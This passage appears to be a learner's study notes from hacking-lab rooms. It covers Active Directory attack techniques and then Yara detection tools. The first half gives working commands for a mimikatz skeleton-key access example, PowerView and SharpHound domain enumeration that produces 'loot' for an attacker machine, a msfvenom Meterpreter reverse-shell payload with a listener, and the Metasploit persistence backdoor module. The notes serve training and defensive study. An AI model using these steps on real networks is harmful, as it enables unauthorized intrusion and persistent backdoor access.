example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.

##Enumerating with Powerview

Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

We'll be focusing on how to start up and get users and groups from PowerView.

I have already taken the time and put PowerView on the machine



1.) Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts



2.) Start PowerView - . .\Downloads\PowerView.ps1

3.) Enumerate the domain users - Get-NetUser | select cn    



4.) Enumerate the domain groups - Get-NetGroup -GroupName *admin*    

  

Now enumerate the domain further on your own

Here's a cheatsheet to help you with commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

##Bloodhound and SharpHound

Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

Well be focusing on how to collect the .json files and how to import them into Bloodhound

I have already taken the time to put SharpHound onto the machine 



BloodHound Installation -

1.) apt-get install bloodhound    

2.) neo4j console - default credentials -> neo4j:neo4j

Getting loot w/ SharpHound -

1.) powershell -ep bypass same as with PowerView

2.) . .\Downloads\SharpHound.ps1    

3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip    



4.) Transfer the loot.zip folder to your Attacker Machine

note: you can use scp to transfer the file if you’re using ssh

Mapping the network w/ BloodHound -

1.) bloodhound Run this on your attacker machine not the victim machine

2.) Sign In using the same credentials you set with Neo4j



3.) Inside of Bloodhound search for this icon  and import the loot.zip folder

note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files

4.) To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.



The queries can be as simple as find all domain admins -



Or as complicated as shortest path to high value targets -



There are plenty of queries to choose from and enumerate connections inside of the network

##Maintaining access 

There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.

There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.

This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.

Generating a Payload w/ msfvenom﻿

1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe this will generate a basic windows meterpreter reverse tcp shell



2.) Transfer the payload from your attacker machine to the target machine.

3.) use exploit/multi/handler - this will create a listener on the port that you set it on.

4.) Configure our payload to be a windows meterpreter shell: set payload windows/meterpreter/reverse_tcp

5.) After setting your THM IP address as your "LHOST", start the listener with run

6.)  Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that

7.) Verify that we've got a meterpreter shell, where we will then backgroundit to run the persistence module.

Run the Persistence Module -

1.) use exploit/windows/local/persistence this module will send a payload every 10 seconds in default however you can set this time to anything you want

2.) set session 1 set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)



If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.

##MITRE 

MITRE Corporation has created for the cybersecurity community, specifically:

ATT&CK® (Adversarial Tactics, Techniques, and Common Knowledge) Framework
CAR (Cyber Analytics Repository) Knowledge Base
ENGAGE (sorry, not a fancy acronym)
D3FEND (Detection, Denial, and Disruption Framework Empowering Network Defense)
AEP (ATT&CK Emulation Plans)

##Yara

Yara can identify information based on both binary and textual patterns, such as hexadecimal and strings contained within a file.

Rules are used to label these patterns. For example, Yara rules are frequently written to determine if a file is malicious or not, based upon the features - or patterns - it presents.

Strings are a fundamental component of programming languages. Applications use strings to store data such as text.

For example, the code snippet below prints "Hello World" in Python. The text "Hello World" would be stored as a string.


Hello Earth! Can you hear me?

We could write a Yara rule to search for "hello world" in every program on our operating system if we would like. 


Why does Malware use Strings?
Malware, just like our "Hello World" application, uses strings to store textual data. Here are a few examples of the data that various malware types store within strings:

Type	   Data	                                Description
Ransomware	12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw Bitcoin Wallet for ransom payments
Botnet		12.34.56.7                         The IP address of the Command and Control (C&C) server

##Yara rules

The proprietary language that Yara uses for rules is fairly trivial to pick up, hard to master. This is because your rule is only as effective as your understanding of the patterns you want to search for.

Using a Yara rule is simple. Every yara command requires two arguments to be valid, these are:
1) The rule file we create
2) Name of file, directory, or process ID to use the rule for.

Every rule must have a name and condition.

For example, if we wanted to use "myrule.yar" on directory "some directory" we would use the following command:
yara myrule.yar somedirectory

Note that .yar is the standard file extension for all Yara rules.

We'll make one of the most basic rules you can make below.

1. Make a file named "somefile" via touch somefile
2. Open a new file and name it "myfirstrule.yar" like below:



3. With this open, input the snippet below and save the file:

rule examplerule {
        condition: true
}



The name of the rule in this snippet is examplerule, where we have one condition - in this case, the condition is condition. As previously discussed, every rule requires both a name and a condition to be valid. This rule has satisfied those two requirements.

Simply, the rule we have made checks to see if the file/directory/PID that we specify exists via condition: true. If the file does exist, we are given the output of examplerule

Let's give this a try on the file "some file" that we made in step one:

yara myfirstrule.yar somefile

If "some file" exists, Yara will say examplerule because the pattern has been met - as we can see below:


##Yara conditions

Yara has a few conditions, which I encourage you to read here at your own leisure. However, I'll detail a few below and explain their purpose.

Keyword
Desc
Meta
Strings
Conditions
Weight


6.1.1. Meta
This section of a Yara rule is reserved for descriptive information by the author of the rule. For example, you can use `desc`, short for description, to summarise what your rule checks for. Anything within this section does not influence the rule itself. Similar to commenting code, it is useful to summarise your rule.

6.1.2. Strings
Remember our discussion about strings in Task 2? Well, here we go. You can use strings to search for specific text or hexadecimal in files or programs. For example, say we wanted to search a directory for all files containing "Hello World!", we would create a rule such as below:



We define the keyword `Strings` where the string that we want to search, i.e., "Hello World!" is stored within the variable $hello_world

Of course, we need a condition here to make the rule valid. In this example, to make this string the condition, we need to use the variable's name. In this case, $hello_world:


Essentially, if any file has the string "Hello World!" then the rule will match. However, this is literally saying that it will only match if "Hello World!" is found and will not match if "hello world" or "HELLO WORLD."

To solve this, the condition any of them allows multiple strings to be searched for, like below:



Now, any file with the strings of:
- Hello World!
- hello world
- HELLO WORLD

Will now trigger the rule.


6.2. Conditions
We have already used the true and any of them condition. Much like regular programming, you can use operators such as:


<= less than or equal to
>= more than or equal to
!= not equal to

For example, the rule below would do the following:


The rule will now:
- Look for the "Hello World!" string
- Only say the rule matches if there are less than or equal to ten occurrences of the "Hello World!" string


6.3. Combining keywords

Moreover, you can use keywords such as:

and
not
or 

To combine multiple conditions. Say if you wanted the rule to match if any .txt files with "Hello World!" is found, you can use a rule like below:



The rule will only match if both conditions are true. To illustrate: below, the rule we created, in this case, did not match because although the file has "Hello World!" it does not have the .txt extension:


However, the rule matched this time because the file has both "Hello World!" and the `.txt` extension.



Remembering that the text within the red box is the name of our rule, and the text within the green is the matched file.

##Yara modules

Frameworks such as the Cuckoo Sandbox or Python's PE Module allows you to improve the technicality of your Yara rules ten-fold.


7.2. Cuckoo
Cuckoo Sandbox is an automated malware analysis environment. This module allows you to generate Yara rules based upon the behaviours discovered from Cuckoo Sandbox. As this environment executes malware, you can create rules on specific behaviours such as runtime strings and the likes.


7.3. Python PE
Python's PE module allows you to create Yara rules from the various sections and elements of the Windows Portable Executable (PE) structure.

Explaining this structure is out of scope as it is covered in my malware introductory room. However, this structure is the standard formatting of all executables and DLL files on windows. Including the programming libraries that are used. 

Examining a PE file's contents is an essential technique in malware analysis; this is because behaviours such as cryptography or worming can be largely identified without reverse engineering or execution of the sample.

##Yara tools

Knowing how to create custom Yara rules is useful, but luckily you don't have to create many rules from scratch to begin using Yara to search for evil. There are plenty of GitHub resources and open source tools (along with commercial products) that can be utilized to leverage Yara in hunt operations and/or incident response engagements. 

LOKI (what, not who, is Loki?)

LOKI is a free open source IOC (Indicator of Compromise) scanner created/written by Florian Roth.

Based on the GitHub page, detection is based on 4 methods:

File Name IOC Check
Yara Rule Check (we are here)
Hash Check
C2 Back Connect Check
There are additional checks that LOKI can be used for. For a full rundown, please reference the GitHub readme.

LOKI can be used on both Windows and Linux systems. Windows users can download the binary file (here), which will run on both 32-bit and 64-bit systems. Linux users can use the same link to download LOKI.



THOR (superhero named programs for a superhero blue teamer)

THOR Lite is Florian's newest multi-platform IOC AND YARA scanner. There are precompiled versions for Windows, Linux, and macOS. A nice feature with THOR Lite is its scan throttling to limit exhausting CPU resources. For more information and/or to download the binary, start here. You need to subscribe to their mailing list to obtain a copy of the binary. Note that THOR is geared towards corporate customers. THOR Lite is the free version.



FENRIR (naming convention still mythical themed)

This is the 3rd tool created by Neo23x0 (Florian Roth). You guessed it; the previous 2 are named above. The updated version was created to address the issue from its predecessors, where requirements must be met for them to function. Fenrir is a bash script; it will run on any system capable of running bash (nowadays even Windows). 



YAYA (Yet Another Yara Automaton)

YAYA was created by the EFF (Electronic Frontier Foundation) and released in September 2020. Based on their website, "YAYA is a new open-source tool to help researchers manage multiple YARA rule repositories. YAYA starts by importing a set of high-quality YARA rules and then lets researchers add their own rules, disable specific rulesets, and run scans of files."

##Using Loki


Command:
	python ~/tools/Loki/loki.py -p ./file1
	python <path to Loki python file> -p <path to file to scan>
	
##Valhalla

https://valhalla.nextron-systems.com/

GUI based website with yara rules 

##Virus Total

To search file signatures, hash etc. to detect malicious files

https://www.virustotal.com/gui/home/search

